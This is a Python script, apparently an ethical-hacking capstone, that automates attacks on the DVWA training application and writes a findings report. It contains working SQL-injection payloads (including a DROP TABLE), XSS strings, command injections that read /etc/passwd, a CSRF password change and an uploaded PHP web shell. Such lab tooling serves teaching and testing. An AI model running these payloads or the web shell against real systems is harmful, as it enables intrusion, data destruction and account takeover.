#!/usr/bin/env python3
"""
Ethical Hacking Capstone - Automated DVWA Security Scanner
A comprehensive security assessment tool for DVWA (Damn Vulnerable Web Application)

Author: Selwyn Barreto
Date: August 2025
Purpose: Educational cybersecurity assessment and demonstration
"""

import requests
import json
import sys
import argparse
from datetime import datetime
import re
from urllib.parse import urljoin, urlparse
import time
import concurrent.futures
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class DVWASecurityScanner:
    """Automated security scanner for DVWA application"""
    
    def __init__(self, target_url, username='admin', password='password'):
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.results = {
            'target': target_url,
            'scan_start': datetime.now().isoformat(),
            'vulnerabilities': [],
            'scan_summary': {}
        }
        
        # Configure session with retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        self.session.headers.update({
            'User-Agent': 'DVWA-Security-Scanner/1.0 (Educational Use)'
        })
    
    def login(self):
        """Authenticate to DVWA application"""
        print(f"🔑 Logging into DVWA at {self.target_url}")
        
        try:
            # Get login page to retrieve CSRF token
            login_url = urljoin(self.target_url, '/login.php')
            response = self.session.get(login_url)
            
            if response.status_code != 200:
                print(f"❌ Failed to access login page. Status: {response.status_code}")
                return False
            
            # Extract CSRF token if present
            csrf_token = self._extract_csrf_token(response.text)
            
            # Prepare login data
            login_data = {
                'username': self.username,
                'password': self.password,
                'Login': 'Login'
            }
            
            if csrf_token:
                login_data['user_token'] = csrf_token
            
            # Attempt login
            response = self.session.post(login_url, data=login_data)
            
            # Check if login was successful
            if 'index.php' in response.url or 'Welcome' in response.text:
                print("✅ Successfully logged into DVWA")
                return True
            else:
                print("❌ Login failed. Please check credentials.")
                return False
                
        except Exception as e:
            print(f"❌ Login error: {str(e)}")
            return False
    
    def _extract_csrf_token(self, html_content):
        """Extract CSRF token from HTML content"""
        csrf_pattern = r'name=["\']user_token["\'] value=["\']([^"\']+)["\']'
        match = re.search(csrf_pattern, html_content)
        return match.group(1) if match else None
    
    def set_security_level(self, level='low'):
        """Set DVWA security level"""
        print(f"🔧 Setting security level to: {level}")
        
        try:
            security_url = urljoin(self.target_url, '/security.php')
            response = self.session.get(security_url)
            
            if response.status_code != 200:
                print(f"❌ Failed to access security page")
                return False
            
            csrf_token = self._extract_csrf_token(response.text)
            
            security_data = {
                'security': level,
                'seclev_submit': 'Submit'
            }
            
            if csrf_token:
                security_data['user_token'] = csrf_token
            
            response = self.session.post(security_url, data=security_data)
            
            if response.status_code == 200:
                print(f"✅ Security level set to: {level}")
                return True
            else:
                print(f"❌ Failed to set security level")
                return False
                
        except Exception as e:
            print(f"❌ Security level error: {str(e)}")
            return False
    
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        print("💉 Testing SQL Injection vulnerabilities...")
        
        sql_payloads = [
            "1' OR '1'='1",
            "1' UNION SELECT null, version()#",
            "1' UNION SELECT null, database()#",
            "1' UNION SELECT null, user()#",
            "1'; DROP TABLE users--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0#"
        ]
        
        vulnerabilities_found = []
        
        try:
            sqli_url = urljoin(self.target_url, '/vulnerabilities/sqli/')
            
            for payload in sql_payloads:
                params = {'id': payload, 'Submit': 'Submit'}
                response = self.session.get(sqli_url, params=params)
                
                # Check for SQL injection indicators
                sql_indicators = [
                    'mysql', 'syntax error', 'database', 'version()',
                    'information_schema', 'First name:', 'Surname:'
                ]
                
                response_lower = response.text.lower()
                indicators_found = [ind for ind in sql_indicators if ind in response_lower]
                
                if indicators_found:
                    vulnerability = {
                        'type': 'SQL Injection',
                        'severity': 'Critical',
                        'cvss_score': 9.8,
                        'location': sqli_url,
                        'payload': payload,
                        'evidence': indicators_found,
                        'description': 'SQL injection vulnerability allows database manipulation'
                    }
                    vulnerabilities_found.append(vulnerability)
                    print(f"🚨 SQL Injection found with payload: {payload}")
                
                time.sleep(0.5)  # Rate limiting
        
        except Exception as e:
            print(f"❌ SQL Injection test error: {str(e)}")
        
        return vulnerabilities_found
    
    def test_xss_vulnerabilities(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        print("🚨 Testing XSS vulnerabilities...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        vulnerabilities_found = []
        
        # Test Reflected XSS
        try:
            xss_reflected_url = urljoin(self.target_url, '/vulnerabilities/xss_r/')
            
            for payload in xss_payloads:
                params = {'name': payload}
                response = self.session.get(xss_reflected_url, params=params)
                
                # Check if payload is reflected without encoding
                if payload in response.text:
                    vulnerability = {
                        'type': 'Cross-Site Scripting (Reflected)',
                        'severity': 'High',
                        'cvss_score': 8.8,
                        'location': xss_reflected_url,
                        'payload': payload,
                        'description': 'Reflected XSS allows malicious script execution'
                    }
                    vulnerabilities_found.append(vulnerability)
                    print(f"🚨 Reflected XSS found with payload: {payload}")
                
                time.sleep(0.5)
        
        except Exception as e:
            print(f"❌ Reflected XSS test error: {str(e)}")
        
        # Test Stored XSS
        try:
            xss_stored_url = urljoin(self.target_url, '/vulnerabilities/xss_s/')
            
            for payload in xss_payloads[:3]:  # Limit stored XSS tests
                data = {
                    'txtName': payload,
                    'mtxMessage': f'Test message with {payload}',
                    'btnSign': 'Sign Guestbook'
                }
                
                response = self.session.post(xss_stored_url, data=data)
                
                # Check response for stored payload
                if payload in response.text:
                    vulnerability = {
                        'type': 'Cross-Site Scripting (Stored)',
                        'severity': 'High', 
                        'cvss_score': 9.0,
                        'location': xss_stored_url,
                        'payload': payload,
                        'description': 'Stored XSS allows persistent malicious script execution'
                    }
                    vulnerabilities_found.append(vulnerability)
                    print(f"🚨 Stored XSS found with payload: {payload}")
                
                time.sleep(1)  # Longer delay for stored XSS
                
        except Exception as e:
            print(f"❌ Stored XSS test error: {str(e)}")
        
        return vulnerabilities_found
    
    def test_command_injection(self):
        """Test for Command Injection vulnerabilities"""
        print("💻 Testing Command Injection vulnerabilities...")
        
        cmd_payloads = [
            "; whoami",
            "| whoami", 
            "& whoami",
            "; id",
            "; uname -a",
            "; cat /etc/passwd",
            "127.0.0.1; ls -la"
        ]
        
        vulnerabilities_found = []
        
        try:
            cmd_url = urljoin(self.target_url, '/vulnerabilities/exec/')
            
            for payload in cmd_payloads:
                data = {
                    'ip': f"127.0.0.1{payload}",
                    'Submit': 'Submit'
                }
                
                response = self.session.post(cmd_url, data=data)
                
                # Check for command execution indicators
                cmd_indicators = [
                    'www-data', 'root', 'uid=', 'gid=', 'Linux',
                    '/home', '/var/www', 'groups='
                ]
                
                response_lower = response.text.lower()
                indicators_found = [ind for ind in cmd_indicators if ind in response_lower]
                
                if indicators_found:
                    vulnerability = {
                        'type': 'Command Injection',
                        'severity': 'Critical',
                        'cvss_score': 9.9,
                        'location': cmd_url,
                        'payload': payload,
                        'evidence': indicators_found,
                        'description': 'Command injection allows arbitrary system command execution'
                    }
                    vulnerabilities_found.append(vulnerability)
                    print(f"🚨 Command Injection found with payload: {payload}")
                
                time.sleep(0.5)
                
        except Exception as e:
            print(f"❌ Command Injection test error: {str(e)}")
        
        return vulnerabilities_found
    
    def test_csrf_vulnerability(self):
        """Test for CSRF vulnerabilities"""
        print("🔄 Testing CSRF vulnerabilities...")
        
        vulnerabilities_found = []
        
        try:
            csrf_url = urljoin(self.target_url, '/vulnerabilities/csrf/')
            
            # Test password change without proper CSRF protection
            response = self.session.get(csrf_url)
            
            # Check if CSRF tokens are present
            has_csrf_token = 'user_token' in response.text
            
            if not has_csrf_token:
                # Attempt password change via GET (classic CSRF)
                csrf_params = {
                    'password_new': 'newpassword123',
                    'password_conf': 'newpassword123', 
                    'Change': 'Change'
                }
                
                csrf_response = self.session.get(csrf_url, params=csrf_params)
                
                if 'Password Changed' in csrf_response.text:
                    vulnerability = {
                        'type': 'Cross-Site Request Forgery (CSRF)',
                        'severity': 'Medium',
                        'cvss_score': 6.5,
                        'location': csrf_url,
                        'description': 'CSRF vulnerability allows unauthorized actions on behalf of users',
                        'evidence': 'Password change successful without CSRF protection'
                    }
                    vulnerabilities_found.append(vulnerability)
                    print("🚨 CSRF vulnerability found - No CSRF token protection")
            
        except Exception as e:
            print(f"❌ CSRF test error: {str(e)}")
        
        return vulnerabilities_found
    
    def test_file_upload_vulnerability(self):
        """Test for File Upload vulnerabilities"""
        print("📁 Testing File Upload vulnerabilities...")
        
        vulnerabilities_found = []
        
        try:
            upload_url = urljoin(self.target_url, '/vulnerabilities/upload/')
            
            # Create a simple PHP shell
            php_shell = """<?php
            if(isset($_GET['cmd'])) {
                echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
            }
            ?>"""
            
            # Test uploading PHP file
            files = {
                'uploaded': ('shell.php', php_shell, 'application/x-php')
            }
            
            data = {'Upload': 'Upload'}
            
            response = self.session.post(upload_url, files=files, data=data)
            
            if 'successfully uploaded' in response.text.lower():
                vulnerability = {
                    'type': 'Unrestricted File Upload',
                    'severity': 'High',
                    'cvss_score': 8.5,
                    'location': upload_url,
                    'description': 'File upload vulnerability allows malicious file execution',
                    'evidence': 'PHP shell uploaded successfully'
                }
                vulnerabilities_found.append(vulnerability)
                print("🚨 File Upload vulnerability found - PHP shell uploaded")
            
        except Exception as e:
            print(f"❌ File Upload test error: {str(e)}")
        
        return vulnerabilities_found
    
    def run_comprehensive_scan(self):
        """Run all vulnerability tests"""
        print("🔍 Starting comprehensive security assessment...")
        print(f"Target: {self.target_url}")
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 60)
        
        if not self.login():
            print("❌ Cannot proceed without valid authentication")
            return
        
        if not self.set_security_level('low'):
            print("⚠️  Proceeding without setting security level")
        
        # Run all vulnerability tests
        all_vulnerabilities = []
        
        test_functions = [
            self.test_sql_injection,
            self.test_xss_vulnerabilities, 
            self.test_command_injection,
            self.test_csrf_vulnerability,
            self.test_file_upload_vulnerability
        ]
        
        for test_function in test_functions:
            try:
                vulnerabilities = test_function()
                if vulnerabilities:
                    all_vulnerabilities.extend(vulnerabilities)
            except Exception as e:
                print(f"❌ Error in {test_function.__name__}: {str(e)}")
        
        # Update results
        self.results['vulnerabilities'] = all_vulnerabilities
        self.results['scan_end'] = datetime.now().isoformat()
        
        # Generate summary
        self._generate_summary()
        
        print("\n" + "=" * 60)
        print("📊 SCAN COMPLETE")
        print("=" * 60)
        
        return self.results
    
    def _generate_summary(self):
        """Generate scan summary statistics"""
        vulnerabilities = self.results['vulnerabilities']
        
        # Count by severity
        severity_counts = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
        vulnerability_types = {}
        
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'Unknown')
            vuln_type = vuln.get('type', 'Unknown')
            
            if severity in severity_counts:
                severity_counts[severity] += 1
            
            if vuln_type not in vulnerability_types:
                vulnerability_types[vuln_type] = 0
            vulnerability_types[vuln_type] += 1
        
        self.results['scan_summary'] = {
            'total_vulnerabilities': len(vulnerabilities),
            'severity_breakdown': severity_counts,
            'vulnerability_types': vulnerability_types,
            'high_risk_count': severity_counts['Critical'] + severity_counts['High']
        }
    
    def generate_report(self, output_format='json', output_file=None):
        """Generate vulnerability assessment report"""
        if not output_file:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = f'dvwa_security_report_{timestamp}.{output_format}'
        
        if output_format.lower() == 'json':
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=4, default=str)
        
        elif output_format.lower() == 'txt':
            with open(output_file, 'w') as f:
                f.write("DVWA Security Assessment Report\n")
                f.write("=" * 40 + "\n\n")
                f.write(f"Target: {self.results['target']}\n")
                f.write(f"Scan Start: {self.results['scan_start']}\n")
                f.write(f"Scan End: {self.results.get('scan_end', 'In Progress')}\n\n")
                
                # Summary
                summary = self.results['scan_summary']
                f.write("EXECUTIVE SUMMARY\n")
                f.write("-" * 20 + "\n")
                f.write(f"Total Vulnerabilities Found: {summary['total_vulnerabilities']}\n")
                f.write(f"High Risk Issues: {summary['high_risk_count']}\n\n")
                
                f.write("Severity Breakdown:\n")
                for severity, count in summary['severity_breakdown'].items():
                    f.write(f"  {severity}: {count}\n")
                f.write("\n")
                
                # Detailed findings
                f.write("DETAILED FINDINGS\n")
                f.write("-" * 20 + "\n")
                for i, vuln in enumerate(self.results['vulnerabilities'], 1):
                    f.write(f"\n{i}. {vuln['type']}\n")
                    f.write(f"   Severity: {vuln['severity']}\n")
                    f.write(f"   CVSS Score: {vuln.get('cvss_score', 'N/A')}\n")
                    f.write(f"   Location: {vuln['location']}\n")
                    f.write(f"   Description: {vuln['description']}\n")
                    if 'payload' in vuln:
                        f.write(f"   Payload: {vuln['payload']}\n")
                    if 'evidence' in vuln:
                        f.write(f"   Evidence: {vuln['evidence']}\n")
        
        print(f"📄 Report saved as: {output_file}")
        return output_file

def main():
    parser = argparse.ArgumentParser(description='DVWA Automated Security Scanner')
    parser.add_argument('--target', '-t', required=True, 
                       help='Target DVWA URL (e.g., http://localhost/dvwa)')
    parser.add_argument('--username', '-u', default='admin',
                       help='DVWA username (default: admin)')
    parser.add_argument('--password', '-p', default='password',
                       help='DVWA password (default: password)')
    parser.add_argument('--output-format', '-f', choices=['json', 'txt'], 
                       default='json', help='Output format (default: json)')
    parser.add_argument('--output-file', '-o', 
                       help='Output filename (auto-generated if not specified)')
    parser.add_argument('--quiet', '-q', action='store_true',
                       help='Suppress verbose output')
    
    args = parser.parse_args()
    
    if args.quiet:
        import logging
        logging.getLogger().setLevel(logging.WARNING)
    
    try:
        # Initialize scanner
        scanner = DVWASecurityScanner(
            target_url=args.target,
            username=args.username,
            password=args.password
        )
        
        # Run comprehensive scan
        results = scanner.run_comprehensive_scan()
        
        # Generate report
        report_file = scanner.generate_report(
            output_format=args.output_format,
            output_file=args.output_file
        )
        
        # Display summary
        summary = results['scan_summary']
        print(f"\n📊 FINAL SUMMARY:")
        print(f"Total Vulnerabilities: {summary['total_vulnerabilities']}")
        print(f"Critical: {summary['severity_breakdown']['Critical']}")
        print(f"High: {summary['severity_breakdown']['High']}")
        print(f"Medium: {summary['severity_breakdown']['Medium']}")
        print(f"Low: {summary['severity_breakdown']['Low']}")
        print(f"\n📄 Full report: {report_file}")
        
    except KeyboardInterrupt:
        print("\n⚠️  Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"❌ Scanner error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
